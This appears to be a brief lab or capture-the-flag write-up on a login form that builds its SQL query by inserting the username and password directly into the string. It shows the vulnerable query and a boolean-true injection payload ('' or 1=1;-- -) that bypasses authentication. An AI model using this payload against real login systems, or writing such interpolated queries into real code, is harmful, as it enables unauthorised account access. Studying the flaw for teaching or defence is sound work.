_SQL syntax error when single quote is parsed_

Backend SQL query as follows:

```sql
select * from users where username = '$username' AND password = '$password';
```

To exploit, simply inject with `boolean true` SQL injection as follows:

```sql
select * from users where username = '' or 1=1;-- -' AND password = '$password';
```
